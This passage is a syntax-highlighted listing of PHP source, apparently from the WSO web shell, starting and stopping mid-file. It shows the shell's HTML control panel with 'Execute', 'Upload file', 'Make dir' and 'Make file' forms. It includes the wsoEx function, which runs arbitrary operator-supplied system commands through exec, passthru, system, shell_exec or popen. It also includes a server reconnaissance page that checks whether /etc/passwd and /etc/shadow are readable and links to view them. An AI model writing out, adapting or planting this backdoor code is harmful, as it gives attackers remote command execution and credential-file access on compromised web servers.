<span class="lineno"> 238</span> <span class="s2">      &lt;td&gt;&lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesMan&#39;,null,&#39;mkdir&#39;,this.d.value);return false;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;span&gt;Make dir:&lt;/span&gt;</span><span class="si">$is_writable</span><span class="s2">&lt;br&gt;&lt;input class=&#39;toolsInp&#39; type=text name=d&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&lt;/td&gt;</span>
<span class="lineno"> 239</span> <span class="s2">      &lt;td&gt;&lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesTools&#39;,null,this.f.value,&#39;mkfile&#39;);return false;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;span&gt;Make file:&lt;/span&gt;</span><span class="si">$is_writable</span><span class="s2">&lt;br&gt;&lt;input class=&#39;toolsInp&#39; type=text name=f&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&lt;/td&gt;</span>
<span class="lineno"> 240</span> <span class="s2">  &lt;/tr&gt;&lt;tr&gt;</span>
<span class="lineno"> 241</span> <span class="s2">      &lt;td&gt;&lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;Console&#39;,null,this.c.value);return false;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class=&#39;toolsInp&#39; type=text name=c value=&#39;&#39;&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&lt;/td&gt;</span>
<span class="lineno"> 242</span> <span class="s2">      &lt;td&gt;&lt;form method=&#39;post&#39; ENCTYPE=&#39;multipart/form-data&#39;&gt;</span>
<span class="lineno"> 243</span> <span class="s2">      &lt;input type=hidden name=a value=&#39;FilesMAn&#39;&gt;</span>
<span class="lineno"> 244</span> <span class="s2">      &lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;</span>
<span class="lineno"> 245</span> <span class="s2">      &lt;input type=hidden name=p1 value=&#39;uploadFile&#39;&gt;</span>
<span class="lineno"> 246</span> <span class="s2">      &lt;input type=hidden name=charset value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;</span>
<span class="lineno"> 247</span> <span class="s2">      &lt;span&gt;Upload file:&lt;/span&gt;</span><span class="si">$is_writable</span><span class="s2">&lt;br&gt;&lt;input class=&#39;toolsInp&#39; type=file name=f&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&lt;br  &gt;&lt;/td&gt;</span>
<span class="lineno"> 248</span> <span class="s2">  &lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 249</span>                                         <span class="p">}</span>
<span class="lineno"> 250</span>                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getpwuid&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 251</span>                                             <span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 252</span>                                                 <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 253</span>                                             <span class="p">}</span>
<span class="lineno"> 254</span>                                         <span class="p">}</span>
<span class="lineno"> 255</span>                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getgrgid&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 256</span>                                             <span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 257</span>                                                 <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 258</span>                                             <span class="p">}</span>
<span class="lineno"> 259</span>                                         <span class="p">}</span>
<span class="lineno"> 260</span>                                         <span class="k">function</span> <span class="nf">wsoEx</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 261</span>                                             <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 262</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 263</span>                                                 <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
<span class="lineno"> 264</span>                                                 <span class="nv">$out</span> <span class="o">=</span> <span class="o">@</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="lineno"> 265</span> <span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
<span class="lineno"> 266</span>                                             <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 267</span>                                                 <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 268</span>                                                 <span class="o">@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
<span class="lineno"> 269</span>                                                 <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno"> 270</span>                                             <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 271</span>                                                 <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 272</span>                                                 <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
<span class="lineno"> 273</span>                                                 <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno"> 274</span>                                             <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 275</span>                                                 <span class="nv">$out</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
<span class="lineno"> 276</span>                                             <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)))</span> <span class="p">{</span>
<span class="lineno"> 277</span>                                                 <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 278</span>                                                 <span class="k">while</span> <span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="nv">$out</span><span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
<span class="lineno"> 279</span>                                                 <span class="nb">pclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 280</span>                                             <span class="p">}</span>
<span class="lineno"> 281</span>                                             <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
<span class="lineno"> 282</span>                                         <span class="p">}</span>
<span class="lineno"> 283</span>                                         <span class="k">function</span> <span class="nf">wsoViewSize</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 284</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; GB&#39;</span><span class="p">;</span>
<span class="lineno"> 285</span>                                             <span class="k">elseif</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1048576</span><span class="p">)</span> <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1048576</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; MB&#39;</span><span class="p">;</span>
<span class="lineno"> 286</span>                                             <span class="k">elseif</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">&gt;=</span> <span class="mi">1024</span><span class="p">)</span> <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; KB&#39;</span><span class="p">;</span>
<span class="lineno"> 287</span>                                             <span class="k">else</span> <span class="k">return</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39; B&#39;</span><span class="p">;</span>
<span class="lineno"> 288</span>                                         <span class="p">}</span>
<span class="lineno"> 289</span>                                         <span class="k">function</span> <span class="nf">wsoPerms</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 290</span>                                             <span class="k">if</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;</span>
<span class="lineno"> 291</span>                                             <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;l&#39;</span><span class="p">;</span>
<span class="lineno"> 292</span>                                             <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span>
<span class="lineno"> 293</span>                                             <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="p">;</span>
<span class="lineno"> 294</span>                                             <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span><span class="p">;</span>
<span class="lineno"> 295</span>                                             <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="p">;</span>
<span class="lineno"> 296</span>                                             <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span>
<span class="lineno"> 297</span>                                             <span class="k">else</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;u&#39;</span><span class="p">;</span>
<span class="lineno"> 298</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0100</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 299</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0080</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 300</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0040</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno"> 301</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0020</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 302</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0010</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 303</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0008</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno"> 304</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0004</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 305</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0002</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 306</span>                                             <span class="nv">$i</span><span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0001</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;t&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;T&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno"> 307</span>                                             <span class="k">return</span> <span class="nv">$i</span><span class="p">;</span>
<span class="lineno"> 308</span>                                         <span class="p">}</span>
<span class="lineno"> 309</span>                                         <span class="k">function</span> <span class="nf">wsoPermsColor</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 310</span>                                             <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="k">return</span> <span class="s1">&#39;&lt;font color=#FF0000&gt;&#39;</span> <span class="o">.</span> <span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 311</span>                                             <span class="k">elseif</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="k">return</span> <span class="s1">&#39;&lt;font color=white&gt;&#39;</span> <span class="o">.</span> <span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 312</span>                                             <span class="k">else</span> <span class="k">return</span> <span class="s1">&#39;&lt;font color=#25ff00&gt;&#39;</span> <span class="o">.</span> <span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 313</span>                                         <span class="p">}</span>
<span class="lineno"> 314</span>                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;scandir&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 315</span>                                             <span class="k">function</span> <span class="nf">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 316</span>                                                 <span class="nv">$dh</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="lineno"> 317</span>                                                 <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)))</span> <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
<span class="lineno"> 318</span>                                                 <span class="k">return</span> <span class="nv">$files</span><span class="p">;</span>
<span class="lineno"> 319</span>                                             <span class="p">}</span>
<span class="lineno"> 320</span>                                         <span class="p">}</span>
<span class="lineno"> 321</span>                                         <span class="k">function</span> <span class="nf">wsoWhich</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 322</span>                                             <span class="nv">$path</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;which &#39;</span> <span class="o">.</span> <span class="nv">$p</span><span class="p">);</span>
<span class="lineno"> 323</span>                                             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
<span class="lineno"> 324</span>                                             <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 325</span>                                         <span class="p">}</span>
<span class="lineno"> 326</span>                                         <span class="k">function</span> <span class="nf">actionSecInfo</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 327</span>                                             <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 328</span>                                             <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Server security information&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 329</span>                                             <span class="k">function</span> <span class="nf">wsoSecParam</span><span class="p">(</span><span class="nv">$n</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 330</span>                                                 <span class="nv">$v</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno"> 331</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 332</span>                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;&#39;</span> <span class="o">.</span> <span class="nv">$n</span> <span class="o">.</span> <span class="s1">&#39;: &lt;/span&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 333</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="s2">&quot;</span>
<span class="lineno"> 334</span> <span class="s2">&quot;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="k">echo</span> <span class="nv">$v</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 335</span>                                                     <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span> <span class="o">.</span> <span class="nv">$v</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 336</span>                                                 <span class="p">}</span>
<span class="lineno"> 337</span>                                             <span class="p">}</span>
<span class="lineno"> 338</span>                                             <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Server software&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">));</span>
<span class="lineno"> 339</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;apache_get_modules&#39;</span><span class="p">))</span> <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Loaded Apache modules&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nb">apache_get_modules</span><span class="p">()));</span>
<span class="lineno"> 340</span>                                             <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Disabled PHP Functions&#39;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;none&#39;</span><span class="p">);</span>
<span class="lineno"> 341</span>                                             <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Open base dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
<span class="lineno"> 342</span>                                             <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode exec dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_exec_dir&#39;</span><span class="p">));</span>
<span class="lineno"> 343</span>                                             <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode include dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_include_dir&#39;</span><span class="p">));</span>
<span class="lineno"> 344</span>                                             <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;cURL support&#39;</span><span class="p">,</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;curl_version&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;enabled&#39;</span> <span class="o">:</span> <span class="s1">&#39;no&#39;</span><span class="p">);</span>
<span class="lineno"> 345</span>                                             <span class="nv">$temp</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 346</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_get_client_info&#39;</span><span class="p">))</span> <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MySql (&quot;</span> <span class="o">.</span> <span class="nb">mysql_get_client_info</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;)&quot;</span><span class="p">;</span>
<span class="lineno"> 347</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mssql_connect&#39;</span><span class="p">))</span> <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MSSQL&quot;</span><span class="p">;</span>
<span class="lineno"> 348</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pg_connect&#39;</span><span class="p">))</span> <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;PostgreSQL&quot;</span><span class="p">;</span>
<span class="lineno"> 349</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;oci_connect&#39;</span><span class="p">))</span> <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;Oracle&quot;</span><span class="p">;</span>
<span class="lineno"> 350</span>                                             <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Supported databases&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span>
<span class="lineno"> 351</span>                                             <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 352</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;nix&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 353</span>                                                 <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/passwd&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;yes &lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">/etc/</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">passwd</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;[view]&lt;/a&gt;&quot;</span> <span class="o">:</span> <span class="s1">&#39;no&#39;</span><span class="p">);</span>
<span class="lineno"> 354</span>                                                 <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/shadow&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/shadow&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;yes &lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">etc</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">shadow</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;[view]&lt;/a&gt;&quot;</span> <span class="o">:</span> <span class="s1">&#39;no&#39;</span><span class="p">);</span>
